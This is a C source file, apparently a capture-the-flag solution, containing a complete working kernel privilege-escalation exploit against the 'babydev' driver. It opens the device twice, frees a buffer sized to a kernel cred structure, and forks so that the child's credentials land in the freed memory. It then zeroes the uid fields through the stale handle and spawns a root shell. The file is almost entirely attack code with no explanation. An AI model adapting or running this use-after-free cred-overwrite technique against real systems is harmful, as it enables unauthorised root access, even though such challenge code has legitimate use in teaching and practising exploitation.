#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define BABYDRIVER_DEVICE_NAME "/dev/babydev"
#define BABYDRIVER_ALLOC_COMMAND 0x10001
#define CRED_STRUCT_SIZE 168

char CredStruct[CRED_STRUCT_SIZE];

int main(void) {
    int baby1 = open(BABYDRIVER_DEVICE_NAME, O_RDWR);
    if(baby1 < 0) {
        return -1;
    }
    
    int baby2 = open(BABYDRIVER_DEVICE_NAME, O_RDWR);
    if(baby2 < 0) {
        close(baby1);
        return -1;
    }

    ioctl(baby1, BABYDRIVER_ALLOC_COMMAND, CRED_STRUCT_SIZE);
    close(baby1);

    pid_t pid = fork();

    if(pid < 0) {
        puts("Fork failed...");
    } else if(pid == 0) {
        for(int index=0; index<9*4; index++) {
            CredStruct[index] = 0;
        }        
        write(baby2, CredStruct, 9*4);
        printf("Id is now %d\n", geteuid());
        system("/bin/sh");
    } else {
        while(1) {}
    }

    close(baby2);
    return 0;
}